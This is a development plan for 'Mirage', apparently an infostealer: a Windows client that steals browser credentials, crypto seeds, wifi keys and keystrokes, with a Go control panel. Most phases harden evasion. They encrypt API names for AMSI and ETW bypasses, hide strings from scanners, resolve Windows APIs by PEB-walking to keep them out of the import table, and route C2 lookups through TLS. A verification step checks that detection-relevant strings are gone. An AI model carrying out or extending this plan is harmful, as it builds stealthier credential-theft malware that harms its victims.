# Mirage Audit Fixes — Implementation Plan

**Goal:** Fix all 106+ verified audit findings across Mirage C client and Go panel.

**Architecture:** C11 (mingw32, no-CRT, polymorphic) + Go 1.25 panel (PostgreSQL 16, chi, JWT+TOTP).

**Tech Stack:** C11, NASM x64, MinGW, Python 3, Go 1.25, PostgreSQL 16, React/Vite

## Global Constraints

- All `.rdata` strings MUST use `enc_` system (`make_polymorphic.py` → `enc_strings.h`)
- All Win32 API MUST use PEB-walk (`mirage_get_function_by_hash`)
- All crypto keys MUST be zeroed via `mirage_secure_zero()`
- Panel IP extraction MUST use `RemoteAddr` only
- `make polymorph` + `make test-all` MUST pass after each phase
- `cd panel && go test ./internal/...` MUST pass after each phase

---

## Phase 1: AppBound CLSID Fixes (C1–C4)

### Task 1.1: Fix all 4 GUIDs in appbound.c

**Files:** `src/crypto/appbound.c:93-111`
**Source:** `raw/SentinelStealerSource/.../Settings.h`

| Line | FROM | TO |
|------|------|-----|
| 93 | `0x70088608` | `0x708860E0` |
| 99 | `0x1FFCE96C` | `0x1FCBE96C` |
| 105 | `0xF396869E, 0x0C0E` | `0xF396861E, 0x0C8E` |
| 111 | `0xEAD334E8` | `0xEAD34EE8` |

**Commit:** `fix(crypto): correct all 4 AppBound CLSID/IID values`

---

## Phase 2: Plaintext API Names in AMSI/ETW (C7–C8)

### Task 2.1: Add to make_polymorphic.py strings list

```python
("AmsiScanBuffer", "AmsiScanBuffer"),
("EtwEventWrite", "EtwEventWrite"),
("EtwEventWriteEx", "EtwEventWriteEx"),
("RtlAddVectoredExceptionHandler", "RtlAddVectoredExceptionHandler"),
("RtlRemoveVectoredExceptionHandler", "RtlRemoveVectoredExceptionHandler"),
```

Run: `python tools/make_polymorphic.py`

### Task 2.2: Update amsi_bypass.c:148,159,161

Replace `resolve_func(mod, "plaintext")` with `enc_decrypt()` + `resolve_func(mod, buf)`.

### Task 2.3: Update etw_bypass.c:111,113,119,121

Same pattern.

**Commit:** `fix(evasion): encrypt plaintext API names in AMSI/ETW bypass`

---

## Phase 3: Remaining Plaintext Strings (C10, H1–H12)

### Task 3.1: Fix read_file_rm() — chromium.c:480

Replace `_mir_res(ntdll, "NtQuerySystemInformation")` with `enc_decrypt()`.

### Task 3.2: Add 50+ strings to make_polymorphic.py

Categories: proxy C2 identifiers, schannel, panel_http, chrome_crypto, gaming registry, defender/uac registry, detection, persistence, VPN names (18), clipper addresses (3).

### Task 3.3: Encrypt BIP39 wordlist (H1)

Add `rewrite_bip39()` to make_polymorphic.py. Update seed_grabber.c.

### Task 3.4: Update all source files to use enc_decrypt()

**Commit:** `fix: encrypt all remaining plaintext strings in .rdata`

---

## Phase 4: Proxy TLS Fix (C5)

### Task 4.1: Wrap proxy resolution in schannel TLS

**Files:** `src/network/proxy.c:103-169`

Add `tls_connect()` after `ws2_connect()` for both GitHub and Telegram paths. Replace `ws2_send/recv` with `tls_send/recv`.

**Commit:** `fix(network): wrap proxy C2 resolution in schannel TLS`

---

## Phase 5: WebSocket Hub Fixes (C14–C15)

### Task 5.1: Fix Hub broadcast + double-close

**Files:** `panel/internal/ws/hub.go`, `panel/internal/ws/client.go`

- Add `closeOnce sync.Once` to Client
- Fix broadcast: remove from ALL channels before close
- Use `client.closeOnce.Do(func() { close(client.send) })` everywhere

**Commit:** `fix(ws): prevent Hub panics from send-on-closed and double-close`

---

## Phase 6: Rate Limiter Fix (C13)

### Task 6.1: Fix ExtractIP

**Files:** `panel/internal/middleware/ratelimit.go:92-108`

Replace with RemoteAddr-only extraction. Remove X-Forwarded-For trust.

**Commit:** `fix(middleware): use RemoteAddr only in ExtractIP`

---

## Phase 7: CRT Import Elimination (C11, H13)

### Task 7.1: Replace fopen/fread/fwrite with PEB-walked I/O

**Files:** `chromium.c`, `firefox.c`, `cdp_grabber.c`

Use existing PEB-walked `CreateFileA`/`ReadFile`/`CloseHandle`. Replace `getenv()` with `GetEnvironmentVariableW`.

**Commit:** `fix: eliminate CRT file I/O imports from IAT`

---

## Phase 8: Crypto Memory Zeroing (M17–M21)

### Task 8.1: Add secure_zero to all crypto key material

**Files:** `chacha_poly.c`, `chrome_crypto.c`, `firefox_crypto.c`, `archive_crypt.c`, `appbound.c`

Add `mirage_secure_zero(key, sizeof(key))` after each key use.

**Commit:** `fix(crypto): zero all key material after use`

---

## Phase 9: Logic Bug Fixes (M1–M11)

| Task | File | Fix |
|------|------|-----|
| 9.1 | clipboard.c:82 | Add 4-byte UTF-8 path |
| 9.2 | keylogger.c:270 | Add `default: return NULL;` |
| 9.3 | wifi.c:107 | Replace `& 0x7F` with `?` |
| 9.4 | gaming.c:56 | Add depth limit (16) |
| 9.5 | schannel.c:267,405 | Add iteration caps |

---

## Phase 10: Panel Security Fixes (H19–H28)

| Task | File | Fix |
|------|------|-----|
| 10.1 | helpers.go:43 | Return false for nil claims |
| 10.2 | jwt.go + migration | Add token_version for revocation |
| 10.3 | totp.go:24 | Require current TOTP for re-setup |
| 10.4 | users.go:81 | Validate invite roles |
| 10.5 | .env | Remove secrets, gitignore |
| 10.6 | auth.go:352 | Handle DB errors in reset |
| 10.7 | screenshots.go:89 | Fix mustOpen nil panic |

---

## Phase 11: Verification

- [ ] `make clean && make polymorph` — SUCCESS
- [ ] `make test-all` — All PASS
- [ ] `strings mirage.exe | grep -iE "AmsiScanBuffer|EtwEventWrite|saltysalt|UNISP_NAME|log.zip|mirage_c2"` — No matches
- [ ] `cd panel && go test ./internal/... -v` — All PASS
- [ ] `cd panel && go vet ./...` — No issues
- [ ] Create PR

---

## Critical Files

| File | Why |
|------|-----|
| `tools/make_polymorphic.py` | All new strings go here first |
| `src/crypto/appbound.c:93-111` | 4 wrong CLSID values |
| `src/evasion/amsi_bypass.c:148-161` | Plaintext API names |
| `panel/internal/ws/hub.go:36-49` | Double-close panics |
| `panel/internal/middleware/ratelimit.go:92` | XFF spoof bypass |
